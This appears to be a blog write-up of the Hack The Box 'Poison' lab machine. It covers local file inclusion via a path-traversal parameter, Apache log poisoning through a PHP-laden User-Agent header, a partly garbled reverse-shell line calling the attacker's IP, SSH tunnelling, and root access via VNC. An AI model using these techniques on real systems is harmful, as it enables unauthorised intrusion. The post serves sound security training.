---
id: 3456
title: 'Hackthebox &#8211; Poison'
date: '2022-04-15T07:57:58+00:00'
author: vedanttare
excerpt: 'In this post, we are going to be pwning "Poison" from Hackthebox.'
layout: post
guid: 'http://vedanttare.com/?p=3456'
permalink: /hackthebox-poison/
powerkit_share_buttons_transient_facebook:
    - '1692134041'
powerkit_share_buttons_transient_pinterest:
    - '1727946369'
image: 'http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-2.26.57-PM-496x166.png'
categories:
    - Writeups
---

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-2.25.58-PM.png)

IP: 10.10.10.84

## Enumeration

After doing a simple nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/poison 10.10.10.84`, we get,

Ports open:

- 22/ssh
- 80/http

Checking the webpage on port 80, we could see that we could run some php files and display them such as ini.php or phpinfo.php.

![](http://vedanttare.com/wp-content/uploads/2022/04/php-file-image-poison.png)

The files were displayed and the URL was: `http:///browse.php?file=phpinfo.php`. So, what this was probably doing is that the browse.php file probably had some php code which is used to ‘GET’ other files by specifying the file parameter. Trying for LFI: `…….?file=../../../../etc/passwd`, we were displayed with the `/etc/passwd` file, we got LFI.

![](http://vedanttare.com/wp-content/uploads/2022/04/etcpasswd-file-img.png)

Now we wanted and rce, and as the name of the box goes which is poison, I got 2 things in mind, one was web cache poisoning(not so relevant here) and the other was log file poisoning. To get an rce we need to call and see the log file first, and for that we need to know the location of the log file on the server. I tried the normal location for log file on apache web server: `/var/log/httpd/access.log` but no luck.

Then I tried to search on google for file paths for apache24 and I got the apache documentation which had the path to the configuration file which was a banger as we could see all paths from the config file.

Check the config file and got the location of log file: `/var/log/httpd-access.log`

![](http://vedanttare.com/wp-content/uploads/2022/04/conf-file-with-log-file.png)

Now finally, we navigate to the log file and get,

![](http://vedanttare.com/wp-content/uploads/2022/04/log-file.png)

## Exploitation

### Log file Poisoning

To get rce we need to use a technique called log file poisoining in which we embed some code in the request header of the log file and successfully execute that code.

Embedding some php code in the User-agent header in the request.

`GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1<br></br>Host: 10.10.10.84<br></br>User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/68.0<br></br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br></br>Accept-Language: en-US,en;q=0.5<br></br>Accept-Encoding: gzip, deflate<br></br>Connection: close<br></br>Upgrade-Insecure-Requests: 1`

**—–Output——–**

10.10.14.6 – – \[11/Oct/2020:16:25:58 +0200\] “GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1” 200 2234 “-” “Mozilla/5.0 total 72  
drwxr-xr-x 2 root wheel 512 Mar 19 2018 .  
drwxr-xr-x 6 root wheel 512 Jan 24 2018 ..  
-rw-r–r– 1 root wheel 33 Jan 24 2018 browse.php  
-rw-r–r– 1 root wheel 289 Jan 24 2018 index.php  
-rw-r–r– 1 root wheel 27 Jan 24 2018 info.php  
-rw-r–r– 1 root wheel 33 Jan 24 2018 ini.php  
-rw-r–r– 1 root wheel 90 Jan 24 2018 listfiles.php  
-rw-r–r– 1 root wheel 20 Jan 24 2018 phpinfo.php  
-rw-r–r– 1 root wheel 1267 Mar 19 2018 pwdbackup.txt

We had code execution. Now, we just to use a simple payload to get a reverse shell.

Our reverse shell payload will be,

![](http://vedanttare.com/wp-content/uploads/2022/04/rev-shell-payload.png)

And the code execution,

![](http://vedanttare.com/wp-content/uploads/2022/04/code-execution.png)

………………………….  
……………………………  
…………………………..  
User-Agent: Mozilla/5.0 &amp;1|telnet 10.10.14.6 9001 clear &gt; /tmp/f’); ?&gt; Gecko/20100101 Firefox/68.0

After setting up a listener on our kali machine, we get a reverse shell!

![](http://vedanttare.com/wp-content/uploads/2022/04/rev-shell.png)

## Privilege Escalation

We have got a shell as `www` and we need to get root by passing a user charix.There was a file pwdbackup.txt which had base64 encoded string in it which was encoded 13 times.

![](http://vedanttare.com/wp-content/uploads/2022/04/pwdbackup13.png)

So we had to base64 decode this file 13 times. To do this we used:

`for i in $(seq 1 13); do echo -n ‘ | base64 -d’; done`  
–&gt; What this does is that it just print ‘| base64 -d’ 13 times

Then we copy the string in a file and just decode it using our ‘| base64 -d’:  
`cat passwd | base64 -d | base64 -d | base64 -d |……………………………………………….`

And we get a password:  
`kali@starscorp1o  ~/htb/boxes/poison  cat password | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d`

`password: Charix!2#4%6&8(0`

Using this password to ssh into the machine as the user charix.

Now we to get root.

There is a zip file that we found in /home/charix called secret.zip. Transferring that to our kali machine and then unzipping it using the password from the base64 decoded string we get some non-ASCII characters which we will use later.

Checking the services:

We can see that there is a vnc process running as root.

![](http://vedanttare.com/wp-content/uploads/2022/04/vnc-root.png)

Checking if any other ports are open locally:

`netstat -a | grep LIST`

`Active Internet connections (including servers)<br></br>Proto Recv-Q Send-Q Local Address Foreign Address (state)<br></br>tcp4 0 0 10.10.10.84.37093 10.10.14.6.9000 ESTABLISHED<br></br>tcp4 0 0 10.10.10.84.http 10.10.14.6.49062 CLOSE_WAIT<br></br>tcp4 0 0 localhost.smtp <em>.</em> LISTEN<br></br>tcp4 0 0 *.http *.* LISTEN<br></br>tcp6 0 0 *.http *.* LISTEN<br></br>tcp4 0 0 *.ssh *.* LISTEN<br></br>tcp6 0 0 *.ssh *.* LISTEN<br></br>tcp4 0 0 localhost.5801 <em>.</em> LISTEN<br></br>tcp4 0 0 localhost.5901 <em>.</em> LISTEN<br></br>udp4 0 0 *.syslog *.*<br></br>udp6 0 0 *.syslog *.*`

![](http://vedanttare.com/wp-content/uploads/2022/04/local-ports-open.png)

Services running:

![](http://vedanttare.com/wp-content/uploads/2022/04/services.png)

We could see that there are 2 ports are open and they are vnc ports, and we also have a vnc service running as root!

Using ssh port forwarding to tunnel the traffic over ssh:

`ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 (on kali machine)`

Checking the browser we have nothing. Using vncviewer to view the vnc program on the ports and supplying the password from the secret.zip file:

`kali@starscorp1o  ~/htb/boxes/poison  vncviewer -passwd secret 127.0.0.1::5901<br></br>Connected to RFB server, using protocol version 3.8<br></br>Enabling TightVNC protocol extensions<br></br>Performing standard VNC authentication<br></br>Authentication successful<br></br>Desktop name "root's X desktop (Poison:1)"<br></br>VNC server default format:<br></br>32 bits per pixel.<br></br>Least significant byte first in each pixel.<br></br>True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0<br></br>Using default colormap which is TrueColor. Pixel format:<br></br>32 bits per pixel.`

The vnc gui/program opens up and we see that it is running as root!

![](http://vedanttare.com/wp-content/uploads/2022/04/vnc-running-root.png)

And hence we are root and from there we can grab the root flag.

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Bounty](https://vedanttare.com/hackthebox-bounty/)

<iframe class="wp-embedded-content" data-secret="upnPXrMebN" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-bounty/embed/#?secret=ui6EPK1IWL#?secret=upnPXrMebN" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Bounty” — VEDANT TARE" width="600"></iframe></div></figure>